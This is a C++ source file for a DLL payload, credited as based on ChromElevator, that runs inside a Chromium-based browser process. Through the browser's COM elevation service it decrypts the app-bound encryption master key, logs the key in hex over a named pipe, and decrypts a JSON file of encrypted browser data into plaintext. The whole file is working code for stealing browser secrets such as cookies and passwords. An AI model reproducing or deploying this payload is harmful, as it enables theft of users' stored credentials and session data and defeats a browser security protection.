// decryptor_payload.cpp – Phase 2: Decrypt encrypted.json using ABE key
// (c) Based on ChromElevator by Alexander 'xaitax' Hagenah
// Licensed under the MIT License.

#include "../core/common.hpp"
#include "../sys/internal_api.hpp"
#include "../payload/pipe_client.hpp"
#include "../payload/browser_config.hpp"
#include "../com/elevator.hpp"
#include "../crypto/aes_gcm.hpp"
#include <fstream>
#include <filesystem>
#include <nlohmann/json.hpp>

using namespace Payload;
using json = nlohmann::json;

struct ThreadParams {
    HMODULE hModule;
    LPVOID lpPipeName;
};

std::vector<uint8_t> FromBase64(const std::string& b64) {
    DWORD size = 0;
    CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &size, nullptr, nullptr);
    std::vector<uint8_t> data(size);
    CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, data.data(), &size, nullptr, nullptr);
    return data;
}

std::string ToHex(const std::vector<uint8_t>& data) {
    std::string hex;
    for (auto b : data) {
        char buf[3];
        sprintf_s(buf, "%02X", b);
        hex += buf;
    }
    return hex;
}

DWORD WINAPI DecryptorThread(LPVOID lpParam) {
    auto params = std::unique_ptr<ThreadParams>(static_cast<ThreadParams*>(lpParam));
    PipeClient pipe(static_cast<LPCWSTR>(params->lpPipeName));
    if (!pipe.IsValid()) {
        FreeLibraryAndExitThread(params->hModule, 0);
        return 1;
    }

    try {
        auto config = pipe.ReadConfig();
        auto browser = GetConfigs().at(config.browserType);
        pipe.LogDebug("Decryptor running in " + browser.name);

        if (!Sys::InitApi(config.verbose))
            pipe.LogDebug("Syscall init warning");

        std::filesystem::path outputDir(config.outputPath);
        std::filesystem::path encPath = outputDir / "encrypted.json";
        if (!std::filesystem::exists(encPath)) {
            pipe.Log("ERROR: encrypted.json not found");
            FreeLibraryAndExitThread(params->hModule, 0);
            return 1;
        }

        std::ifstream inFile(encPath);
        json data = json::parse(inFile);
        inFile.close();

        if (data.empty()) {
            pipe.Log("ERROR: encrypted.json is empty");
            FreeLibraryAndExitThread(params->hModule, 0);
            return 1;
        }

        // Find ABE key from first entry that has non‑empty "related_abe"
        std::vector<uint8_t> masterKey;
        for (const auto& item : data) {
            if (item.contains("related_abe") && item["related_abe"].is_string() && !item["related_abe"].get<std::string>().empty()) {
                std::string abeKeyBase64 = item["related_abe"].get<std::string>();
                auto encryptedKey = FromBase64(abeKeyBase64);
                if (!encryptedKey.empty()) {
                    Com::Elevator elevator;
                    masterKey = elevator.DecryptKey(encryptedKey, browser.clsid, browser.iid,
                        browser.iid_v2, browser.name == "Edge",
                        browser.name == "Avast");
                    pipe.Log("KEY:" + ToHex(masterKey));
                    break;
                }
            }
        }

        if (masterKey.empty()) {
            pipe.Log("ERROR: No valid ABE key found in encrypted.json");
            FreeLibraryAndExitThread(params->hModule, 0);
            return 1;
        }

        json decryptedArray = json::array();
        int decryptedCount = 0, plaintextCount = 0, failedCount = 0;

        for (const auto& item : data) {
            json out = item;
            std::string encB64 = item.value("encrypted_text", "");
            if (encB64.empty()) {
                out["decrypted_text"] = nullptr;
                failedCount++;
                decryptedArray.push_back(out);
                continue;
            }

            auto blob = FromBase64(encB64);
            std::string relatedAbe = item.value("related_abe", "");

            if (relatedAbe == "none") {
                // Already plaintext – decode base64 and output as text
                std::string plaintext(blob.begin(), blob.end());
                out["decrypted_text"] = plaintext;
                plaintextCount++;
            }
            else if (!relatedAbe.empty()) {
                auto plain = Crypto::AesGcm::Decrypt(masterKey, blob);
                if (plain && !plain->empty()) {
                    std::string dec((char*)plain->data(), plain->size());
                    out["decrypted_text"] = dec;
                    decryptedCount++;
                }
                else {
                    out["decrypted_text"] = nullptr;
                    failedCount++;
                }
            }
            else {
                // No related_abe (legacy) – treat as plaintext
                std::string plaintext(blob.begin(), blob.end());
                out["decrypted_text"] = plaintext;
                plaintextCount++;
            }
            decryptedArray.push_back(out);
        }

        std::filesystem::path decPath = outputDir / "decrypted.json";
        std::ofstream outFile(decPath);
        outFile << decryptedArray.dump(4);
        outFile.close();

        pipe.Log("DECRYPTED:" + std::to_string(decryptedCount) + ":" + std::to_string(plaintextCount) + ":" + std::to_string(failedCount));
        pipe.Log("INFO: Decrypted JSON written to " + decPath.string());
    }
    catch (const std::exception& e) {
        pipe.Log("[-] " + std::string(e.what()));
    }

    FreeLibraryAndExitThread(params->hModule, 0);
    return 0;
}

extern "C" __declspec(dllexport) void Bootstrap(LPVOID lpPipeName) {
    auto params = new ThreadParams{ GetModuleHandle(NULL), lpPipeName };
    HANDLE hThread = CreateThread(NULL, 0, DecryptorThread, params, 0, NULL);
    if (hThread) CloseHandle(hThread);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
    }
    return TRUE;
}